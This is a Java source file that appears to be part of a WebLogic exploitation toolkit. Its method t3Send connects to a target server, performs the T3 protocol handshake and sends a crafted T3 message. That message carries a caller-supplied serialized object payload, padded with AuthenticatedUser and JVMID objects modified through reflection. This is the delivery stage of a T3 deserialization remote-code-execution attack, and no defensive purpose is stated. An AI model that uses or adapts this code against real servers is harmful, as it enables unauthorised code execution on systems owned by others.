package util.t3tool;


import weblogic.rjvm.JVMID;
import weblogic.security.acl.internal.AuthenticatedUser;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.Socket;

public class WeblogicT3 {

    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        return ctor;
    }
    public static void t3Send(String host, String port, byte[] payload) throws Exception {
        Socket s = new Socket(host, Integer.parseInt(port));
        //AS ABBREV_TABLE_SIZE HL remoteHeaderLength 用来做skip的
        String header = "t3 7.0.0.0\nAS:10\nHL:19\n\n";

        s.getOutputStream().write(header.getBytes());
        s.getOutputStream().flush();
        BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
        String versionInfo = br.readLine();

        versionInfo = versionInfo.replace("HELO:", "");
        versionInfo = versionInfo.replace(".false", "");
        System.out.println("weblogic version:" + versionInfo);


        //cmd=1,QOS=1,flags=1,responseId=4,invokableId=4,abbrevOffset=4,countLength=1,capacityLength=1

        //t3 protocol
        String cmd = "08";
        String qos = "65";
        String flags = "01";
        String responseId = "ffffffff";
        String invokableId = "ffffffff";
        String abbrevOffset = "00000000";
        String countLength = "01";
        String capacityLength = "10";//必须大于上面设置的AS值
        String readObjectType = "00";//00 object deserial 01 ascii

        StringBuilder datas = new StringBuilder();
        datas.append(cmd);
        datas.append(qos);
        datas.append(flags);
        datas.append(responseId);
        datas.append(invokableId);
        datas.append(abbrevOffset);

        //because of 2 times deserial
        countLength = "04";
        datas.append(countLength);

        //define execute operation
        String pahse1Str = bytesToHexString(payload);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(pahse1Str);

        //for compatiable fo hide
        //for compatiable fo hide
        AuthenticatedUser authenticatedUser = new AuthenticatedUser("weblogicxxxx", "admin123");
        String phase4 = bytesToHexString(serialize(authenticatedUser));
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(phase4);

        JVMID src = new JVMID();

        Constructor constructor = JVMID.class.getDeclaredConstructor(java.net.InetAddress.class,boolean.class);
        constructor.setAccessible(true);
        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
        Field serverName = src.getClass().getDeclaredField("differentiator");
        serverName.setAccessible(true);
        serverName.set(src,1);

        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(bytesToHexString(serialize(src)));

        JVMID dst = new JVMID();

        constructor = JVMID.class.getDeclaredConstructor(java.net.InetAddress.class,boolean.class);
        constructor.setAccessible(true);
        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
        serverName = src.getClass().getDeclaredField("differentiator");
        serverName.setAccessible(true);
        serverName.set(dst,1);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(bytesToHexString(serialize(dst)));

        byte[] headers = hexStringToBytes(datas.toString());
        int len = headers.length + 4;
        String hexLen = Integer.toHexString(len);
        StringBuilder dataLen = new StringBuilder();

        if (hexLen.length() < 8) {
            for (int i = 0; i < (8 - hexLen.length()); i++) {
                dataLen.append("0");
            }
        }

        dataLen.append(hexLen);
        s.getOutputStream().write(hexStringToBytes(dataLen + datas.toString()));
        s.getOutputStream().flush();
        s.close();

    }
    public static String bytesToHexString(byte[] src) {
        StringBuilder stringBuilder = new StringBuilder("");
        if (src == null || src.length <= 0) {
            return null;
        }
        for (int i = 0; i < src.length; i++) {
            int v = src[i] & 0xFF;
            String hv = Integer.toHexString(v);
            if (hv.length() < 2) {
                stringBuilder.append(0);
            }
            stringBuilder.append(hv);
        }
        return stringBuilder.toString();
    }

    public static byte[] hexStringToBytes(String hexString) {
        if (hexString != null && !hexString.equals("")) {
            hexString = hexString.toUpperCase();
            int length = hexString.length() / 2;
            char[] hexChars = hexString.toCharArray();
            byte[] d = new byte[length];

            for (int i = 0; i < length; ++i) {
                int pos = i * 2;
                d[i] = (byte) (charToByte(hexChars[pos]) << 4 | charToByte(hexChars[pos + 1]));
            }

            return d;
        } else {
            return null;
        }
    }
    private static byte charToByte(char c) {
        return (byte) "0123456789ABCDEF".indexOf(c);
    }

    public static byte[] serialize(final Object obj) throws IOException {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        final ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        objOut.flush();
        objOut.close();
        return out.toByteArray();
    }

}


